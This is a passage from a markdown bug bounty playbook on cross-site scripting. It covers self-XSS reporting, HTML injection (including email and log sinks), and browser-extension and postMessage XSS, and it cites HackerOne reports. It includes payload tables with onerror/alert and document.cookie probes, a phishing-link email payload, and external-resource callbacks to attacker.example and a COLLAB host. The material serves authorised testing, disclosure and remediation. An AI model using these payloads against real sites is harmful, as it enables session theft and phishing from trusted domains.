- `178611` — <https://hackerone.com/reports/178611> — Revive Adserver. Reflected XSS on
  Zones → Invocation Code.
- `177508` — <https://hackerone.com/reports/177508> — Starbucks. *"Reflected XSS by
  exploiting CSRF vulnerability on teavana.com wishlist comment module."* — a
  self-XSS escalated by CSRF, the same pattern as `SELF-018`.

### 12. Professional Vulnerability Report Template

`````markdown
# Self-XSS in <feature> via <field> — breaks <validation flow>

## Summary
A payload entered in <field> executes only in the injecting user's session. The
underlying defect is <the missing validation/escaping flow>, which is the actionable
issue.

## Why this is worth reporting
<State the broken flow, or the chain primitive if you have one.>

## Severity
low — <self-XSS alone, or chain severity if demonstrated.>

## Affected feature
`https://<host>/<path>` · Field: `<name>` · Program: <name>

## Proof of concept
1. In your own account, set `<field>` to `<payload>`.
2. Trigger: `<the specific UI action>`.
3. `document.domain` reads `<origin>`.

### Multi-user check (performed)
- [ ] Tested with a second account — payload does **not** trigger cross-user.
      → If it does, this is stored XSS; see Stored-XSS.md.

### Chain analysis
- [ ] CSRF / login CSRF / session fixation / referrer control reviewed.
      Finding: <describe, or "none found">

## Remediation
<Context-appropriate encoding; for URL fields, a scheme allow-list.>

## Regression tests
<Include the cross-user test.>
`````

**Reporting discipline.** Title it accurately — say "Self-XSS" in the title so triage
can triage it immediately. Lead the summary with the **broken flow**, not the payload.
State explicitly that you tested the multi-user path. Never claim victim account loss
you have not demonstrated.

### 13. References

- PortSwigger — What is self-XSS and is it a security issue?: <https://portswigger.net/research/self-xss>
- OWASP — XSS Prevention Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP — CSRF Prevention Cheat Sheet (for the chain cases): <https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html>
- OWASP — URL handling / open redirect guidance: <https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html>
- MDN — `javascript:` URL scheme: <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/void>
- Reports cited: <https://hackerone.com/reports/212721>, <https://hackerone.com/reports/164027>,
  <https://hackerone.com/reports/125059>, <https://hackerone.com/reports/171398>,
  <https://hackerone.com/reports/166709>, <https://hackerone.com/reports/177508>,
  <https://hackerone.com/reports/170156>, <https://hackerone.com/reports/178611>

### 14. Research Gaps and Further Investigation

- **Small sample with limited modern coverage.** 24 sources, all pre-2017. Modern
  self-XSS vectors (clipboard-based, `window.opener`, service-worker-registered,
  browser-extension-mediated) are absent.
- **No data on current program policy.** Whether self-XSS is paid, triaged as
  informative, or rejected varies by program and has changed since 2017. The
  2014–2017 payments recorded here should not be assumed to hold.
- **Unresolved: how often self-XSS reports were actually stored XSS.** Several
  researchers titled their reports ambiguously. Whether the multi-user path was tested
  is not consistently recorded, so §4's central recommendation has no archive-derived
  hit-rate.
- **Worth investigating:** whether a self-XSS becomes exploitable when the input field
  is reachable via a shared link, a support agent, or an admin impersonation feature.
  None of the sources here test that path.



---

<!-- PART 10 of 12 :: HTML-Injection.md -->

## HTML Injection

### 1. Overview

HTML injection is the injection of attacker-controlled **markup** without script
execution. It sits on a spectrum:

````
inert markup  →  HTML injection  →  script execution (XSS)
   (text)        (elements,           (CSP not present)
                  attributes,
                  no script)
````

Some reports in this archive stopped deliberately at the middle rung. **That restraint
is correct and this playbook documents it as a first-class outcome.**

> **Merge rationale.** HTML injection shares its root cause, its testing methodology,
> and its remediation with XSS — missing context-correct output encoding. It is
> separated from [`Context-Based-XSS.md`](../../Context-Based-XSS.md) only because the
> *demonstrated impact differs*, which changes how the report should be written and how
> a triager should read it. If you are looking for testing methodology, use
> [`Reflected-XSS.md`](../../Reflected-XSS.md) §4; this file covers the boundary cases and
> the non-browser sinks.

### 2. Root Cause and Technical Mechanics

Identical to XSS — the output is not encoded for its context. What differs is **where
the markup is interpreted**:

| Sink type | Case | Consequence |
| --- | --- | --- |
| Browser DOM, script blocked | `HTML-008` (`179426`, Blockchain, medium) | CSP "even blocks 'self'"; researcher declined to claim script execution |
| Browser DOM, IE only | `HTML-012` (`200826`, Algolia, medium) | separate PoC per browser |
| **Email client** | `HTML-001` (`2735`, RelateIQ) | phishing content sent *from* the target's domain |
| **Server-rendered file** | `HTML-005` (`146278`, Nextcloud) | HTML in a downloaded log |
| DOM, via `innerHTML` | `HTML-011` (`200753`, Ubiquiti), `HTML-012` | client-side markup injection |
| Pre-render only | `HTML-010` (`198907`, VK.com, low) | parsed *before* saving, inert after |

#### 2.1 Non-browser sinks — the genuinely distinct part

`HTML-001` (RelateIQ) is the most important report in this playbook, because the sink
is **not a browser**. The researcher put HTML in a **first name** field, then triggered
an invite:

> "I was able to edit the contents of the 'Invite Collaborators' mail, by using HTML
> code as my first name. By exploiting this vulnerability, an attacker could send an
> email with custom text/html code from `[REDACTED_EMAIL]` (from the RelateIQ
> server) to any recipient. This can be used for phishing attacks."

Reproduction: register with the payload as the first name → send an invite →
`You have been hacked. Click <a href="http://phishing-site">here</a> to reset your
password.<div style="display:none">`

**Why this is a distinct testing problem.** Email clients sanitise inconsistently and
many block `<script>`, but they reliably render links and formatting. A tester who only
looks for `alert(1)` will conclude there is nothing here. **Test the email sink with
phishing-grade markup**, not with a script payload.

`HTML-005` (Nextcloud) is the second non-browser case: HTML injected into the
application **log** via the `Host` header, later downloaded by an admin. The team
explained the browser-dependent execution and correctly concluded *"the document would
only be executed locally."*

#### 2.2 The restraint case — a model for triage

`HTML-008` (`179426`, Blockchain, medium, `$100`) deserves reading in full. The
researcher proved markup injection with two harmless payloads —
`"><h1>XSS here` and `"><marquee>XSS here` — and then wrote:

> "Due to the strict Content Security Policy which even blocks 'self', arbitrary
> javascript cannot be executed through this vulnerability **without some CSP bypass**.
> Great! :)"

and closed with a concrete remediation recommendation:

> "Make sure to properly encode the last part of the URL before printing it to the
> page. Another possible solution is to make sure the URL matches a strict whitelist
> regexp."

This is what a well-scoped, honest report looks like at the HTML-injection level:
demonstrated impact stated precisely, unproven impact explicitly withheld, and a fix
proposed.

#### 2.3 The correctly-filed negative result

`HTML-010` (`198907`, VK.com, low) is the archive's best example of a filter weakness
reported *as a filter weakness*. The researcher stored `<img src=x` (no closing bracket)
in a document tags field and observed:

> "It will be parsed in that area, but after saving it, **it won't parse**."
>
> "**POTENTIAL:** I'm still looking into this, as this could be a possible XSS vuln if
> I can find vectors without closing brackets that have harmful code."
>
> "**WHY IT WORKS:** The reason this works is because your filter only looks for opening
> AND closing brackets, when it is possible to run code without closing the brackets."

A filter analysis, a precise observation, and an honest statement that XSS is not yet
demonstrated. That is a complete, well-formed report — of a smaller thing.

### 3. Attack Surface and Preconditions

| Surface | Case | Sink |
| --- | --- | --- |
| Invite / notification emails | `HTML-001` | email client |
| Log files and exports | `HTML-005` | downloaded file rendered as HTML |
| URL path segments echoed into pages | `HTML-008` | HTML text, CSP blocks script |
| `github-btn.html` style embeds | `HTML-012`, `HTML-011` | `innerHTML` |
| Document/metadata tags | `HTML-010` | pre-render only |
| Desktop / native clients | `HTML-013` (`206877`, ownCloud), `HTML-006` (`150179`, Twitter) | app-rendered markup |
| Marketplace / extension frames | `HTML-002` (`6843`, concrete5) | server-rendered attribute |
| Markdown-ish surfaces | `HTML-004` | see source index |

**Preconditions:** usually a write account for the stored cases; none for the reflected
ones. Email sinks additionally require the application to *send* the value — the trigger
is an application action (invite, notification, export), not a page view.

### 4. Manual Testing Methodology

1. **Establish markup control first** — `<h1>xss-marker` or `<marquee>`. This is the
   correct first rung for this class and for XSS.
2. **Then decide whether to escalate.** Attempt script execution. If it does not fire,
   determine *why*: CSP, sanitiser, browser-specific parsing. Record the reason.
3. **Report at the rung you actually reached.** Say "HTML injection" and state that
   script execution was not achieved, with the reason. Do not report XSS you have not
   demonstrated.
4. **Test the non-browser sinks explicitly.** For any user input that flows into an
   email, notification, PDF, CSV, log, or export:
   - Phishing-grade markup: `<a href="https://attacker.example">…</a>`,
     `<img src="https://attacker.example/pixel.png">`, `<h1>`, hidden `<div>`.
   - Confirm the content is rendered **and** that it originates from the target's
     sending domain.
   - Check for external-resource loading, which is your OOB proof.
5. **For pre-render-only sinks, test persistence.** `HTML-010` found the distinction
   between "parsed in the editor" and "parsed after save". Test both states explicitly.
6. **Attribute break-outs** are the main non-CSP path to real script here — try
   `"` and `'` alongside `<`/`>`, per
   [`Reflected-XSS.md`](../../Reflected-XSS.md) §5.

### 5. Input and Output Context Analysis

The HTML-text context is the primary one here, and the CSP behaviour determines the
ceiling:

| Condition | Result |
| --- | --- |
| No CSP, `<` `>` unencoded | **XSS** — report as XSS, not HTML injection |
| CSP without `unsafe-inline`, no bypass | markup injection only (`HTML-008`) |
| CSP `script-src` with `unsafe-inline` | **XSS** |
| Markup in an attribute | try quote break-out; if it works → XSS |
| Markup in an email body | phishing; script depends on the mail client |
| Markup in a downloaded file | depends on how the OS/browser handles it (`HTML-005`) |
| Markup parsed only pre-save | not a vulnerability (`HTML-010`) |

**The triage question that separates this class from XSS:** *can script execute, and
did you demonstrate it?* Everything else is detail.

### 6. Test Cases and Proof-of-Concepts

#### 6.1 Historical payloads (verbatim from the cited reports)

| Case | Report | Payload |
| --- | --- | --- |
| HTML-008 | `179426` | `/en/block-index/1160457/%22%3E%3Ch1%3EXSS%20here` and `%22%3E%3Cmarquee%3EXSS%20here` |
| HTML-001 | `2735` | `You have been hacked. Click <a href="http://phishing-site">here</a> to reset your password.<div style="display:none">` |
| HTML-002 | `6843` | `dashboard/extend/connect/"%20onmouseover="alert(document.cookie)">` |
| HTML-005 | `146278` | `Host: -->test"<img src=a onerror=alert('xss')>` |
| HTML-012 | `200826` | `github-btn.html?#&user=<h1><marquee>HTML<br>…&type=follow` (PoC #1, Chrome/IE) |

#### 6.2 Newly authored illustrations (not from the archive)

**Stage 1 — markup control (the correct primary test).** Newly authored.

````
"><h1>xss-marker
"><marquee>xss-marker
"><details open ontoggle=alert(1)>xss-marker
````

`HTML-008` used exactly the first two. The third is a modern, inert-until-interacted
markup probe.

**Stage 2 — external-resource proof (for email/PDF/export sinks).** Newly authored.

````html
<img src="https://COLLAB/?rendered=1" width="1" height="1">
<a href="https://COLLAB/">click</a>
````
A hit on `COLLAB` proves the sink rendered the markup **and** gives you the OOB
evidence the report needs.

**Stage 3 — attribute break-out (escalate toward XSS).** Newly authored.

````
" onmouseover="xss-marker
' onmouseover='xss-marker
````

**Safe proof.** External-resource callbacks beat `alert(1)` here: they prove rendering
*and* execution origin simultaneously, and they work in email clients that block
scripts.

### 7. Encoding, Filtering, and Parsing Behavior

| Behaviour | Case | Ceiling |
| --- | --- | --- |
| Strict CSP (even blocking `'self'`) | `HTML-008` | markup injection |
| Browser-specific behaviour | `HTML-012`, `HTML-013` | IE-only or per-app |
| Per-widget sanitiser inconsistency | `HTML-012` vs `HTML-011` (same `github-btn.html` pattern, different hosts) | varies per deployment |
| Filter matching only *paired* brackets | `HTML-010` | filter weakness, no XSS |
| Application-generated comment wrapping, bypassed with `--> … -->` | `HTML-005` | HTML injection in a file |
| No encoding at all in email template | `HTML-001` | phishing content from a trusted domain |

`HTML-010`'s filter analysis is worth carrying forward as a general technique: **read
the filter, then look for inputs it does not match**, rather than throwing payloads.
That single habit produces findings in every class in this knowledge base.

### 8. Impact and Severity Considerations

| Report | Program | Severity | Bounty | Demonstrated impact |
| --- | --- | --- | --- | --- |
| `179426` HTML-008 | Blockchain | medium | $100 | markup injection; script blocked by CSP |
| `198907` HTML-010 | VK.com | low | not disclosed | filter weakness only |
| `200826` HTML-012 | Algolia | medium | $100 | markup injection (Chrome/IE); XSS (IE) |
| `2735` HTML-001 | RelateIQ | not disclosed | not disclosed | phishing email from the target's domain |

**Impact ladder, and how the archive prices it:**

1. **Markup injection with CSP blocking script** → low/medium. `HTML-008` at medium
   with a CSP-scoped statement.
2. **Filter weakness, no execution** → low/informative. `HTML-010`.
3. **Markup injection in a brand-trusted email** → phishing with excellent
   credibility. `HTML-001`. Note this is arguably *more* dangerous than a
   CSP-limited DOM bug, because email links are clicked and mail clients sanitise
   inconsistently — but it is not "XSS", and mislabelling it will cost you the triage.
4. **Any attribute break-out or `javascript:` URL** → real XSS; reclassify.

### 9. False Positives and Limitations

- **Markup injection is not XSS.** Label it accurately. `HTML-008`'s researcher wrote
  *"arbitrary javascript cannot be executed through this vulnerability"* and was not
  penalised for it.
- **A pre-render-only injection is not a vulnerability.** `HTML-010` established
  precisely this.
- **CSP is a real ceiling — verify it yourself.** Do not take a report's word, and do
  not take the *absence* of a claimed CSP. Fetch the headers.
- **Browser-specific is not universal.** `HTML-012` supplied a separate IE PoC "using
  X-UA-Compatible IE=9" alongside a Chrome/IE markup PoC. Modern browsers behave
  differently; verify.
- **Email sinks are not browser sinks.** Do not claim "JavaScript executed" for a
  phishing email unless you have shown execution *in a mail client*.
- **Filter weaknesses are not XSS.** Report the filter. `HTML-010` did this and the
  report is complete and useful without an exploit.
- **Check the CSP header value, not just its presence.** `HTML-008`'s CSP reportedly
  blocked `'self'` — unusually strict, and it changes the ceiling entirely.

### 10. Remediation and Regression Testing

#### 10.1 Remediation

- **HTML-encode the output for its context** — the same rules as XSS
  ([`Reflected-XSS.md`](../../Reflected-XSS.md) §10.1). Encoding does not depend on whether
  script execution was achieved; the markup is the defect.
- **For email templates specifically**, use a dedicated HTML-email templating layer
  with escaping by default and no raw-HTML passthrough for user fields. Never
  interpolate user input into an email body.
- **For exports and logs**, emit them as genuinely inert formats (`text/plain`, or
  JSON with `Content-Disposition: attachment` + `nosniff`).
- **Replace bracket-pair filters** with real encoding. `HTML-010`'s analysis is the
  argument: filters that look for opening *and* closing brackets are structurally
  bypassable.
- **Sanitise with an allow-list** where markup is genuinely intended.
- **CSP as defence in depth**, not as the fix.

#### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| `"><h1>`, `"><marquee>`, `"><details open ontoggle=…` in every reflecting field | markup escaped |
| Same, in every field that reaches an email/notification | email body escaped |
| External-resource probe in email/export output → no callback | no render |
| Assert exported logs/files are served `text/plain` + `nosniff` + `attachment` | inert format |
| Pair-bracket filter test cases: `<img src=x`, `<a href=x`, `<<h1>` | no bracket-pair filter remains |
| Assert CSP present **and** inspected for `unsafe-inline` | defence in depth, correctly configured |

### 11. Historical Bug Bounty Case Studies

Sourced facts only. Inventory: [`references/source-index.md`](../../references/source-index.md).

---

#### HTML-008 — Reflected XSS on blockchain.info (markup injection, CSP-scoped)

- **Program:** Blockchain · **Report:** <https://hackerone.com/reports/179426>
- **Archive listing:** <https://h1.security.nathan.sx/blockchain.html>
- **Published:** 2016-11-01 · **Weakness:** `XSS - Generic` · **Severity:** medium
- **Bounty:** $100 · **Body inspected:** Yes — **full report**.

**Affected feature:** the final URL path segment of `https://blockchain.info/en/block-index/<id>/<segment>`.

**PoCs (as submitted):**
````
https://blockchain.info/en/block-index/1160457/%22%3E%3Ch1%3EXSS%20here
https://blockchain.info/en/block-index/1160457/%22%3E%3Cmarquee%3EXSS%20here
````

**Scope statement (researcher, verbatim):** *"Due to the strict Content Security Policy
which even blocks 'self', arbitrary javascript cannot be executed through this
vulnerability without some CSP bypass. Great! :)"*

**Test environment (stated):** Firefox 49.0.2 and Chrome 54.0.2840.71.

**Recommended remediation (researcher, verbatim):** *"Make sure to properly encode the
last part of the URL before printing it to the page. Another possible solution is to
make sure the URL matches a strict whitelist regexp, so that this part of the URL is
not put on the page at all if it looks fishy."*

---

#### HTML-001 — HTML injection in "Invite Collaborators" (RelateIQ)

- **Program:** RelateIQ · **Report:** <https://hackerone.com/reports/2735>
- **Archive listing:** <https://h1.security.nathan.sx/relateiq.html>
- **Weakness:** `XSS - Generic` · **Severity / Bounty / date:** not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the **first name** field at registration; content reaches an
outbound **invitation email** sent from `[REDACTED_EMAIL]`.

**Payload (as submitted):**
````
You have been hacked. Click <a href="http://phishing-site">here</a> to reset your password.<div style="display:none">
````

**Reproduction (as submitted):**
1. Register as a new user; enter the payload in the first-name field.
2. Complete registration.
3. Go home and send an invite to a target.
4. The target receives the phishing email.

**Impact as claimed, verbatim:** *"an attacker could send an email with custom text/html
code from `[REDACTED_EMAIL]` (from the RelateIQ server) to any recipient. This can
be used for phishing attacks."* The researcher noted: *"In this simple example it is
obvious that the email is fake, but better exploit code can be easily written."*

**Why it matters here:** the sink is an **email client**, and the value originates from
the target's own sending domain. No browser CSP applies.

---

#### HTML-010 — HTML Injection possible due to bad filter (VK.com)

- **Program:** VK.com · **Report:** <https://hackerone.com/reports/198907>
- **Archive listing:** <https://h1.security.nathan.sx/vkcom.html>
- **Weakness:** `XSS - Generic` · **Severity:** low · **Bounty / date:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** the **tags** field on a document edit page.

**Reproduction (as submitted):**
1. Go to documents; upload anything and edit it.
2. On the edit page, in tags, enter code without a closing bracket, e.g. `<img src=x`.
3. Click enter.
4. *"It will be parsed in that area, but after saving it, it won't parse."*

**Honest status (researcher, verbatim):** *"I'm still looking into this, as this could
be a possible XSS vuln if I can find vectors without closing brackets that have harmful
code."*

**Filter analysis (researcher, verbatim):** *"The reason this works is because your
filter only looks for opening AND closing brackets, when it is possible to run code
without closing the brackets."*

---

#### HTML-012 — [github.algolia.com] DOM Based XSS github-btn.html

- **Program:** Algolia · **Report:** <https://hackerone.com/reports/200826>
- **Archive listing:** <https://h1.security.nathan.sx/algolia.html>
- **Weakness:** `XSS - Generic` · **Severity:** medium · **Bounty:** $100
- **Body inspected:** Yes — **full report**.

**Affected feature:** `https://github.algolia.com/github-btn.html`, parameters `user`,
`repo`, `type`.

**Vulnerable code (quoted in the report):** the script parses `window.location.href`
into `params`, then:
````js
"follow" == type && (mainButton.className += " github-me", text.innerHTML = "Follow @" + user, button.href = "https://github.com/" + user
````

**PoC #1 (as submitted) — HTML injection, Chrome/IE:**
````
https://github.algolia.com/github-btn.html?#&user=<h1><marquee>HTML<br>HTML<br>…&type=follow
````

**PoC #2 (as submitted) — XSS, IE:** an attacker page sets
`<meta http-equiv="X-UA-Compatible" content="IE=9">` and iframes the target with
`user=yrdy<script>alert(document.domain);alert(document.cookie);//&type=follow`.

**The reporter's browser split is the useful part:** PoC #1 is explicitly
*"HTML Injection for Chrome, Internet Explorer"*; PoC #2 is *"XSS for Internet Explorer
(using X-UA-Compatible IE=9)"*. Correctly scoped, correctly labelled.

---

#### HTML-002 — Cross-Site Scripting in getMarketplacePurchaseFrame (concrete5)

- **Program:** concrete5 · **Report:** <https://hackerone.com/reports/6843>
- **Archive listing:** <https://h1.security.nathan.sx/concrete5.html>
- **Weakness:** `XSS - Generic` · **Severity / Bounty:** not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** `getMarketplacePurchaseFrame()` in
`web/concrete/core/libraries/marketplace.php`, reachable via
`dashboard/extend/connect.php`.

**Root cause (researcher):** the `$mp->getProductBlockID()` variable *"is not being
filtered properly to protect against HTML injection/XSS"*.

**PoC (as submitted):** `dashboard/extend/connect/"%20onmouseover="alert(document.cookie)">`

**Evidence quality (researcher):** the report links the exact source lines on GitHub —
`marketplace.php#L176` and `connect.php#L14`. Linking source is the strongest
evidence standard available and materially shortens triage.

---

#### Supporting HTML-injection sources (full bodies retrieved)

- **HTML-011** `200753` — <https://hackerone.com/reports/200753> — Ubiquiti, medium.
  Same `github-btn.html` pattern on `nutty.ubnt.com` — a **per-deployment** instance of
  `HTML-012`, useful evidence that shared third-party embeds are inconsistently fixed.
- **HTML-005** `146278` — <https://hackerone.com/reports/146278> — Nextcloud. Log-file
  HTML injection; full case study in
  [`File-Upload-and-SVG-XSS.md`](../../File-Upload-and-SVG-XSS.md) §11.
- **HTML-006** `150179` — <https://hackerone.com/reports/150179> — Twitter.
  *"Html Injection and Possible XSS in sms-be-vip.twitter.com"* — note the researcher's
  own title hedged: possible XSS.
- **HTML-013** `206877` — <https://hackerone.com/reports/206877> — ownCloud, low.
  HTML injection in the Desktop Client.

### 12. Professional Vulnerability Report Template

`````markdown
# HTML injection in <feature> via <parameter> — script execution <blocked | not attempted | achieved>

## Summary
<Parameter> is reflected/stored into a <context> without HTML encoding, allowing
attacker-controlled markup to render in <origin>. [If applicable:] script execution is
prevented by <CSP / sanitiser / browser>.

## Demonstrated impact
- [x] Markup control — `<h1>xss-marker` renders
- [ ] Script execution — <why not: CSP / sanitiser / not reached>

## Severity
<rating> — <scope the rating to what you demonstrated>

## Affected endpoint
`https://<host>/<path>?<param>=` · Program: <name>

## Proof of concept
### Markup control
````
https://<host>/<path>?<param>="><h1>xss-marker
````
> `<h1>` renders as an element. Screenshot attached.

### Script execution attempt
````
https://<host>/<path>?<param>=...
````
> Result: <did not execute>. Reason: <CSP header / sanitiser / browser>. Header evidence
> pasted below.

````
content-security-policy: <the actual header>
````

## Remediation
HTML-encode for the output context. See §10.1.

## Test environment
Browser: <name + version> · Date: <YYYY-MM-DD>
`````

**Reporting discipline.** State which rung you reached and **why you did not reach the
next**. Paste the CSP header rather than asserting it. Do not call markup injection
XSS. If the sink is an email or export, say so explicitly — it changes the impact
argument entirely.

### 13. References

- OWASP Cheat Sheet — XSS Prevention: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- MDN — Content Security Policy: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP>
- OWASP — HTML sanitization and validation: <https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html>
- OWASP — Email security / injection in mail bodies: <https://cheatsheetseries.owasp.org/cheatsheets/Email_Security_Cheat_Sheet.html>
- Reports cited: <https://hackerone.com/reports/179426>, <https://hackerone.com/reports/2735>,
  <https://hackerone.com/reports/198907>, <https://hackerone.com/reports/200826>,
  <https://hackerone.com/reports/6843>, <https://hackerone.com/reports/200753>,
  <https://hackerone.com/reports/146278>, <https://hackerone.com/reports/150179>,
  <https://hackerone.com/reports/206877>

### 14. Research Gaps and Further Investigation

- **Only 13 sources**, and HackerOne has no HTML-injection weakness category, so these
  are scattered across `XSS - Generic`. The real population is larger.
- **The email-sink class is under-explored and under-appreciated.** `HTML-001` shows a
  phishing-grade primitive from the target's own sending domain. This deserves its own
  testing methodology — and, per §4 step 4, different payloads — but only one archived
  source covers it.
- **`HTML-012`'s IE PoC is unverified today.** The `X-UA-Compatible IE=9` technique is
  legacy and almost certainly inert in current browsers. Not re-tested here.
- **Untested:** HTML injection into PDF generators, into `mailto:`/`tel:` link bodies,
  into SMS gateways, and into push-notification payloads — all plausible extensions of
  `HTML-001` with no archived source.
- **Suggested original research:** for every app that sends user-derived content by
  email, test whether the mail body is escaped. This is a small, high-yield, largely
  unmined surface.



---

<!-- PART 11 of 12 :: Browser-Extension-and-Messaging-XSS.md -->

## Browser Extension and Messaging XSS

### 1. Overview

Third-party code running in your users' browsers can inject script into *your*
application's pages. Two mechanisms dominate this archive:

1. **Browser extensions** that manipulate the DOM of sites they do not own — content
   scripts run with the page's origin privileges for DOM purposes.
2. **`window.postMessage`** listeners that fail to validate `event.origin`, or that
   sanitise `event.data` in a shape-dependent way.

Both break the assumption that "only my code touches my pages." The application can be
entirely correct about its own output encoding and still be XSS'd by code the vendor
installed.

All 8 sources were retrieved **with full report bodies**.

### 2. Root Cause and Technical Mechanics

#### 2.1 Extensions as a DOM-injection source

`DOM-016` (`220494`, Algolia, high) is the archetype. The **Awesome Autocomplete for
GitHub** extension — Algolia's own product — inserted unsanitised HTML into
`github.com`'s DOM:

1. Search GitHub for `'"><img src=x onerror=` → *"Note the broken `<img>` element and
   requests to `x` on GitHub.com."*
2. Search for `a'"><h1` → *"Because of a specific repository name being loaded, a
   JavaScript alert dialog will appear."*

The mechanism is `innerHTML`-style insertion of repository/username data the extension
did not encode. The browser attributes the resulting script to
`github.com`'s origin, so the extension effectively lends its extension privilege to an
attacker on a site it does not control.

The researcher's own disclaimer is exemplary:

> "Please note that I **do not have ownership nor affiliation** with the repository and
> user names in this report, nor the final JavaScript alert dialog."

Declaring which inputs are yours is mandatory here, because almost every input is
somebody else's.

`BROW-004` (`119453`, Veris) is the same shape with a fragment source on
`www.veris.in/?#<img src=x onerror=alert(1)>`, with the reporter linking the vulnerable
bundled source:
`wp-content/plugins/Ultimate_VC_Addons/assets/min-js/ultimate.min.js?ver=…`

#### 2.2 `postMessage` — origin validation and data shape

`DOM-018` (`231053`, Shopify, $3,000) is the most instructive. Full case study in
[`DOM-Based-XSS.md`](../../DOM-Based-XSS.md) §11; the mechanics are summarised here because
they are the archetype of a **sanitiser bypass via object shape**.

The endpoint registers a `postMessage` listener. Origin was not checked. Content *was*
escaped — but the escaping operated on the incoming object, and by sending a value
that is *"clone-able" per the HTML5 structured clone algorithm*, the reporter caused the
escaping to see a different representation than the one later used for rendering.

Team summary: *"a clever bypass of the escaping code we had in place to prevent code
injection."*

**Two independent controls, both insufficient:**
- No `event.origin` allow-list → any origin can send.
- Shape-dependent escaping → a crafted object defeats it.

Fixing either alone would have closed this. That is the lesson.

#### 2.3 Embedded SDKs — the trust boundary is the app, not the user

`BROW-008` (`217745`, Shopify, high, $800) and `FRAM-004` (`217790`, Shopify, high,
$1,000`) both concern the **Embedded App SDK**, where a malicious *installed app*
gains execution in the store admin's session.

`BROW-008`'s root cause: *"Buttons can define an `href` parameter which will open when
the button is clicked. The `href` parameter is not properly sanitized allowing a
malicious app to execute JavaScript in the context of the admin interface."* The
`clickButton` method passes `data.href` to `Page.visit(href, {reload: true})` with no
scheme validation — the same "URL field without a scheme allow-list" defect as
[`Self-XSS.md`](../../Self-XSS.md) `SELF-021`, but across a **trust boundary**.

The reporter also opened by cross-referencing, which is the correct practice:

> "This report is similar in impact, exploitability and root-cause as report #205701
> requiring an additional step of user-interaction."

#### 2.4 Third-party embeds that fetch attacker content

`BROW-007` (`191909`, Discourse, high, $256) is an **image-link parser** failure:

> `http://host/path/to/image'onerror=alert(1);//.png`
>
> "We have an invalid image URL which finish with an image extension (PNG). By putting
> the `'` we are able to break the `img` tag in which the image url is included by the
> parser and add custom code, allowing us to run Javascript code. A malicious user
> could use the `$.getScript` function to load a malicious script."

A markdown image parser that validates the *extension* but not the *quote characters*
is a parser differential — the same family as
[`Filter-Bypass-and-Encoding.md`](../../Filter-Bypass-and-Encoding.md) §2.3.

### 3. Attack Surface and Preconditions

| Surface | Case | Precondition |
| --- | --- | --- |
| Extension content scripts | `DOM-016`, `BROW-004` | victim has the extension installed |
| `postMessage` listeners | `DOM-018` | any remote origin can message |
| Embedded-app SDK methods | `BROW-008`, `FRAM-004` | malicious app installed on the target's store |
| Markdown / image-link parsers | `BROW-007` | attacker can post content |
| Third-party media/embed widgets | `BROW-006` (`191380`, Twitter, $1,680) | file served inline on a trusted host |
| CDN-hosted third-party JS on your pages | implicit | script served from your origin |

**Ownership is the scoping question.** An XSS in someone else's extension is a report
against *them*. `DOM-016` was accepted on Algolia's program because the extension was
Algolia's. Getting this wrong wastes a report.

### 4. Manual Testing Methodology

#### 4.1 For extensions you own

1. **Enumerate every DOM write** in the content script: `innerHTML`, `outerHTML`,
   `insertAdjacentHTML`, `document.write`, jQuery `.html()`.
2. **Determine the trust level of each value.** Extension code routinely renders
   **remote, attacker-controlled** data: usernames, repository names, issue titles, URLs.
   Treat all of it as untrusted.
3. **Test the *data*, not just your own fields.** You rarely control a repository name,
   so test with names you create on a platform where you can — `DOM-016`'s researcher
   searched for `'"><img src=x onerror=` and `a'"><h1`, which works on ordinary
   third-party content.
4. **Test on the host site's origin**, because that is where execution lands.
5. **Declare ownership explicitly** in the report.

#### 4.2 For `postMessage` listeners you own

1. **Find every listener** in your codebase and in shipped bundles.
2. **Check for `event.origin` validation** *before* any use of `event.data`.
3. **Probe with a non-matching origin first** — if a listener responds, origin
   validation is absent.
4. **Probe data shape.** Send: a string, an array, an object, a nested object, and
   objects with `toString`/`valueOf` overrides. A sanitiser that only handles strings
   is bypassable (`DOM-018`).
5. **Confirm the coercion step** — the fix is `String(event.data)` (or the expected
   type) *before* sanitising, not after.

#### 4.3 For embedded apps and SDKs

1. **Establish that you can install a malicious app** on a target — otherwise the
   finding is out of scope.
2. **Enumerate every SDK method** that renders a value or accepts a URL.
3. **Test `href`-like parameters for scheme validation** (`javascript:`, `data:`,
   `vbscript:`).
4. **Test whether any value reaches a template engine or a DOM sink** — see
   [`Framework-and-Template-XSS.md`](../../Framework-and-Template-XSS.md).

#### 4.4 For markdown / link parsers

Test that the parser validates the **whole construct**, not just the extension:
`'`, `"`, `<`, `>`, `)`, spaces, and `javascript:` inside the URL part.

### 5. Input and Output Context Analysis

| Context | Case | Break-out |
| --- | --- | --- |
| Extension writing remote text into the page | `DOM-016` | `a'"><h1`, `'"><img src=x onerror=` |
| Extension reading `location.hash` | `BROW-004` | `#<img src=x onerror=alert(1)>` |
| `postMessage` → sanitiser → DOM | `DOM-018` | clone-able object defeats escaping |
| SDK `href` → `Page.visit()` | `BROW-008` | unsanitised `href`, e.g. `javascript:` |
| SDK modal input → lodash/twine | `FRAM-004` | `data-define` attribute re-parsed |
| Markdown image `src` → `<img>` tag | `BROW-007` | `'onerror=…` before a `.png` extension |
| Served file, inline, trusted host | `BROW-006` | `.jpg` path renamed to `.html` |

### 6. Test Cases and Proof-of-Concepts

#### 6.1 Historical payloads (verbatim from the cited reports)

| Case | Report | Payload / technique |
| --- | --- | --- |
| DOM-016 | `220494` | search GitHub for `'"><img src=x onerror=` and `a'"><h1` |
| BROW-004 | `119453` | `https://www.veris.in/?#<img src=x onerror=alert(1)>` |
| BROW-007 | `191909` | `http://host/path/to/image'onerror=alert(1);//.png` |
